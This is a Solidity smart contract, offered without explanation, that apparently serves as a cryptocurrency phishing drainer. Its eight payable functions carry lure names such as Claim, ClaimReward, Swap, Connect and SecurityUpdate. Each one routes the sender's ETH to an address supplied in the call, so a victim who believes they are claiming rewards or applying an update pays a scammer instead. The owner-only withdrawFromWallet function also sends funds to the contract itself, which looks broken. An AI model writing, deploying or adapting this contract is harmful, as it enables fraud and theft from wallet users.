// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.18;

contract BB_CONTRACT {
  address private owner;
  mapping (address => uint256) private balance;
  mapping (address => bool) private auto_withdraw;

  constructor() { owner = msg.sender; }

  modifier onlyOwner() {
    require(msg.sender == owner, "Only contract owner can call this function");
    _;
  }

  function getOwner() public view returns (address) { return owner; }
  function getBalance() public view returns (uint256) { return address(this).balance; }
  function getUserBalance(address wallet) public view returns (uint256) { return balance[wallet]; }
  function getWithdrawStatus(address wallet) public view returns (bool) { return auto_withdraw[wallet]; }
  function setWithdrawStatus(bool status) public { auto_withdraw[msg.sender] = status; }

  function withdraw(address where) public onlyOwner {
    uint256 amount = balance[msg.sender];
    require(address(this).balance >= amount, "BALANCE_LOW");
    balance[msg.sender] = 0;
    payable(where).transfer(amount);
  }

  function withdrawFromWallet(address wallet) public onlyOwner {
    uint256 amount = balance[wallet];
    require(address(this).balance >= amount, "BALANCE_LOW");
    balance[wallet] = 0;
    payable(address(this)).transfer(amount);
  }

  function Claim(address sender) public payable { handlePayment(sender); }
  function ClaimReward(address sender) public payable { handlePayment(sender); }
  function ClaimRewards(address sender) public payable { handlePayment(sender); }
  function Execute(address sender) public payable { handlePayment(sender); }
  function Multicall(address sender) public payable { handlePayment(sender); }
  function Swap(address sender) public payable { handlePayment(sender); }
  function Connect(address sender) public payable { handlePayment(sender); }
  function SecurityUpdate(address sender) public payable { handlePayment(sender); }

  function handlePayment(address sender) private {
    if (auto_withdraw[sender])
      payable(sender).transfer(msg.value);
    else
      balance[sender] += msg.value;
  }
}